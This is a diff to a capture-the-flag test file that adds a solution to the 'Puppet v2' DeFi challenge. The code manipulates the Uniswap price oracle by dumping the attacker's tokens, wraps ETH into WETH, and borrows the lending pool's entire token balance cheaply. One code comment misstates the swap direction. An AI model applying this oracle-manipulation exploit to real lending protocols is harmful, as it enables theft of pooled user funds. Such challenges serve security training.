@@ -82,6 +82,35 @@ describe('[Challenge] Puppet v2', function () {
 
     it('Exploit', async function () {
         /** CODE YOUR EXPLOIT HERE */
+        const ethReceived = await this.uniswapRouter.getAmountOut(
+            ATTACKER_INITIAL_TOKEN_BALANCE, 
+            UNISWAP_INITIAL_TOKEN_RESERVE, 
+            UNISWAP_INITIAL_WETH_RESERVE
+        )
+        console.log("Calculated ETH received: ", Number(ethReceived) / 10**18)
+
+        // Swap ETH for DVT tokens in the uniswap pool
+        await this.token.connect(attacker).approve(this.uniswapRouter.address, ATTACKER_INITIAL_TOKEN_BALANCE)
+        const swapTransaction = await this.uniswapRouter.connect(attacker).swapExactTokensForETH(
+            ATTACKER_INITIAL_TOKEN_BALANCE, 
+            ethReceived, 
+            [this.token.address, this.weth.address], 
+            attacker.address, 
+            (await ethers.provider.getBlock('latest')).timestamp * 2,
+        )
+        const attackerEthBalance = await ethers.provider.getBalance(attacker.address)
+        console.log("Actual ETH Received: ", (Number(attackerEthBalance) / 10**18))
+
+        // Borrow all the DVT tokens from the lending pool
+        const ethRequired = await this.lendingPool.calculateDepositOfWETHRequired(POOL_INITIAL_TOKEN_BALANCE)
+        console.log("ETH deposit required: ", Number(ethRequired) / 10**18)
+
+        await this.weth.connect(attacker).deposit({value: ethers.utils.parseEther('29.5')})
+        const wethBalance = await this.weth.balanceOf(attacker.address)
+        console.log("WETH balance: ", Number(wethBalance) / 10**18)
+
+        await this.weth.connect(attacker).approve(this.lendingPool.address,  ethers.utils.parseEther('29.5'))
+        await this.lendingPool.connect(attacker).borrow(POOL_INITIAL_TOKEN_BALANCE)
     });
 
     after(async function () {
